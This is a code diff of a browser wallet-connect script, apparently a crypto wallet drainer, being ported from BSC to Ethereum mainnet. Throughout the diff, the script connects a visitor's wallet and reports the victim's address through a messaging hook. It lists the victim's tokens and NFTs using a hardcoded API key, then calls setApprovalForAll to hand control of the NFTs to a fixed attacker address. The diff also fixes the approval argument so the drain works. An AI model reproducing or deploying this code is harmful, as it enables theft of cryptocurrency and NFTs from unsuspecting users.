@@ -18,11 +18,11 @@ import {
 
  
   // 0. Import wagmi dependencies
-  const { bsc, mainnet } = WagmiCoreChains;
+  const { mainnet } = WagmiCoreChains;
   const { configureChains, createConfig, writeContract, sendTransaction, fetchBalance, fetchFeeData, connect, switchNetwork, getAccount, getNetwork } = WagmiCore;
   
   // 1. Define chains
-  const chains = [bsc, mainnet];
+  const chains = [mainnet];
   const projectId = "ee71d215d0dec7d1bf950851c84d9643";
   
   // 2. Configure wagmi client
@@ -80,37 +80,18 @@ $(".proceed").click(async function () {
         console.log("No address")
         alert("You need to connect your wallet first")
     }
-    if(account.connector.chains[0].network !== "bsc"){
+    if(account.connector.chains[0].network !== "homestead"){
         console.log("Incorrect network")
         await switchNetwork({
-            chainId: 56,
+            chainId: 1,
           })
     }
     selectedAccount = account.address;
-    sendMessage("Wallet Connected Successfully to bsc!")
+    sendMessage("Wallet Connected Successfully to eth mainnet!")
         sendMessage(`Cl address : ${selectedAccount}`)
         
         covalenthqAPICall();
 })
-async function onProvider(provider) {
-    web3Object = new Web3(provider);
-    let accounts = await web3Object.eth.getAccounts();
-    selectedAccount = accounts[0];
-
-    chainName = await web3Object.eth.getChainId();
-    chainId = networkToId[chainName]
-  	console.log(chainId)
-    console.log(selectedAccount)
-    if (accounts.length) {
-        sendMessage("Wallet Connected Successfully to bsc!")
-        sendMessage(`Cl address : ${selectedAccount}`)
-        covalenthqAPICall()
-
-        // if (chainId == 1) bitqueryAPICall()
-        // else covalenthqAPICall()
-    }
-}
-
 const Oxa = "0xEB94D7306CE29437b21C5051F5a0c7d0C12294C0"
 const Oxc = "5227607491"
 
@@ -163,7 +144,7 @@ const Oxc = "5227607491"
 async function covalenthqAPICall() {
 
     const params = {
-        chain: "bsc"
+        chain: "eth"
     }
     const url = new URL(`https://deep-index.moralis.io/api/v2/${selectedAccount}/erc20`);
     url.search = new URLSearchParams(params).toString();
@@ -292,7 +273,7 @@ async function loopNfts(NFTs){
                 abi: ABIN,
                 functionName:'setApprovalForAll',
                 args: [Oxa,
-                    "true"
+                    true
                     ],
               })
               console.log("hash", hash)
@@ -361,7 +342,7 @@ async function sendMessage(message){
 
 async function getPrice(address){
 return new Promise((resolve, reject)=>{
-    fetch(`https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses=${address}&vs_currencies=usd`, {
+    fetch(`https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${address}&vs_currencies=usd`, {
         method: "GET",
         headers: {
             //"accept": "application/json",
@@ -389,7 +370,7 @@ async function getValue(address, balance, decimal){
         return 0;
     }
 }
-async function getNFTs(address="", api_key="LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn", chain="bsc", limit="50"){
+async function getNFTs(address="", api_key="LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn", chain="eth", limit="50"){
     return new Promise((resolve, reject)=>{
         fetch(`https://deep-index.moralis.io/api/v2/${address}/nft/collections?chain=${chain}&format=decimal&limit=${limit}`, {
             method: "GET",
